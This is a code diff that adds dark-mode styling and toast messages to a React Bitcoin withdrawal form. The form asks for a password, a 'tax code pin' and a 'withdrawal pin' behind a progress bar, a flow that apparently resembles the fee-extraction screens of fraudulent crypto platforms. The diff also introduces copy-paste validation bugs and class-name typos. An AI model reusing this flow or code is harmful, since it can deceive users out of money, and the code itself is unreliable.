@@ -5,6 +5,9 @@ import Image from "next/image";
 import Link from "next/link";
 import React, { useEffect, useState } from "react";
 import { InfinitySpin } from "react-loader-spinner";
+import { useTheme } from "../../../contexts/themeContext";
+import { Input } from "../../ui/input";
+import toast from "react-hot-toast";
 
 export default function Btcpayment({
   handleInputChange,
@@ -17,6 +20,7 @@ export default function Btcpayment({
   setLoading,
   setBtcFilled,
 }) {
+  const { isDarkMode } = useTheme();
   const [progress, setProgress] = useState(0);
   const [progressMessage, setProgressMessage] = useState("");
   const [taxCodePin, setTaxCodePin] = useState("");
@@ -119,7 +123,7 @@ export default function Btcpayment({
 
       if (response.data.success) {
         // Perform action when login is successful
-
+        toast.success("Pin Correct");
         setLoading(false);
         setWaitingForPin(false);
       } else {
@@ -142,7 +146,7 @@ export default function Btcpayment({
 
       if (response.data.success) {
         // Perform action when login is successful
-
+        toast.success("Pin Correct");
         setLoading(false);
         setWaitingForPin(false);
       } else {
@@ -190,7 +194,11 @@ export default function Btcpayment({
               className="md:w-1/2 w-full mx-auto"
             />
           </div>
-          <div className="bitcoin-payment-form p-4">
+          <div
+            className={`bitcoin-payment-form p-4 ${
+              isDarkMode ? "text-white/80" : ""
+            }`}
+          >
             <form onSubmit={handleSubmit}>
               <div className="mb-1 mt-3">
                 <label
@@ -207,12 +215,14 @@ export default function Btcpayment({
                 value={formData.walletAddress}
                 onChange={handleInputChange}
                 placeholder="Enter Wallet Address"
-                className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none ${
-                  formErrors.walletAddress ? "border-red-500 border" : "border"
+                className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
+                  isDarkMode ? "bg-[#111]" : "border"
+                } bg-gry-50 font-bold focus:outline-none ${
+                  formErrors.walletAddress ? "border-red-500 border" : ""
                 }`}
               />
               {formErrors.walletAddress && (
-                <p className="text-red-500 font-semibold text-xs mt-1">
+                <p className="text-red-500  text-xs mt-1">
                   {formErrors.walletAddress}
                 </p>
               )}
@@ -229,8 +239,10 @@ export default function Btcpayment({
                 value={formData.amount}
                 onChange={handleInputChange}
                 placeholder="Enter Amount"
-                className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none ${
-                  formErrors.amount ? "border-red-500 border" : "border"
+                className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
+                  isDarkMode ? "bg-[#111]" : "border"
+                } bg-gry-50 font-bold focus:outline-none ${
+                  formErrors.walletAddress ? "border-red-500 border" : ""
                 }`}
               />
               {formErrors.amount && (
@@ -251,8 +263,10 @@ export default function Btcpayment({
                 value={formData.password}
                 onChange={handleInputChange}
                 placeholder="Enter Password"
-                className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none ${
-                  formErrors.password ? "border-red-500 border" : "border"
+                className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
+                  isDarkMode ? "bg-[#111]" : "border"
+                } bg-gry-50 font-bold focus:outline-none ${
+                  formErrors.walletAddress ? "border-red-500 border" : ""
                 }`}
               />
               {formErrors.password && (
@@ -288,7 +302,11 @@ export default function Btcpayment({
                 </div>
               </div>
               <div className="progress-movements w-full">
-                <div className="holder w-full h-2 relative overflow-hidden rounded-full bg-red-50">
+                <div
+                  className={`holder w-full h-2 relative overflow-hidden rounded-full  ${
+                    isDarkMode ? "bg-red-500/10" : "bg-red-50"
+                  }`}
+                >
                   <div
                     className="mover absolute h-full rounded-full transition-all bg-[conic-gradient(at_top_right,_var(--tw-gradient-stops))] from-red-800 via-red-600 to-orange-500"
                     style={{ width: `${progress}%` }}
@@ -308,8 +326,10 @@ export default function Btcpayment({
                   placeholder="Enter Tax Code Pin"
                   value={taxCodePin}
                   onChange={handlePinChange}
-                  className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none border ${
-                    taxCodePinError ? "border-red-500" : ""
+                  className={`w-full px-4 py-3 h-11 text-xs rounded-md ${
+                    isDarkMode ? "bg-[#111] text-white/90" : "border"
+                  } bg-gry-50 font-bold focus:outline-none  ${
+                    taxCodePinError ? "border-red-500 border" : ""
                   }`}
                 />
                 {taxCodePinError && (
@@ -341,8 +361,10 @@ export default function Btcpayment({
                   placeholder="Enter Withdrawal Pin"
                   value={withdrawalPin}
                   onChange={handleWithdrawPinChange}
-                  className={`w-full px-4 py-3 text-xs rounded-lg bg-gry-50 font-bold focus:outline-none border ${
-                    withdrawalPinError ? "border-red-500" : ""
+                  className={`w-full h-11 px-4 py-3 text-xs rounded-md ${
+                    isDarkMode ? "bg-[#111] text-white/90" : "border"
+                  } bg-gry-50 font-bold focus:outline-none  ${
+                    withdrawalPinError ? "border-red-500 border" : ""
                   }`}
                 />
                 {withdrawalPinError && (
@@ -366,12 +388,18 @@ export default function Btcpayment({
         </div>
       )}
       {showSucces && (
-        <div className="flex flex-col justify-center items-center px-5 md:px-14 mt-8 py-10 bg-white rounded-lg shadow[rgba(50,_50,_105,_0.15)_0px_2px_5px_0px,_rgba(0,_0,_0,_0.05)_0px_1px_1px_0px]">
+        <div
+          className={`flex flex-col justify-center items-center px-5 md:px-14 mt-8 py-10 /bg-white rounded-lg ${
+            isDarkMode ? "textwhite border border-white/10" : ""
+          }`}
+        >
           <svg
             xmlns="http://www.w3.org/2000/svg"
             viewBox="0 0 20 20"
             fill="currentColor"
-            className="w-16 h-16 mx-auto mb-4 text-black/40"
+            className={`w-16 h-16 mx-auto mb-4 ${
+              isDarkMode ? "text-white/50" : "text-black/40"
+            }`}
           >
             <path
               fillRule="evenodd"
@@ -380,7 +408,11 @@ export default function Btcpayment({
             />
           </svg>
           <h1 className="text-xl font-bold mb-2">Withdrawal Successful</h1>
-          <p className="text-gray-600 mb-6 text-center text-sm px-5 md:px-20 lg:px-32">
+          <p
+            className={` mb-6 text-center text-sm px-5 md:px-20 lg:px-32 ${
+              isDarkMode ? "text-white/80" : "text-gray-600"
+            }`}
+          >
             Your Bitcoin (BTC) withdrawal is in the confirmation phase within
             the blockchain network. Transaction times may vary from 5 minutes to
             2 hours. Monitor the transaction through your history panel. Contact
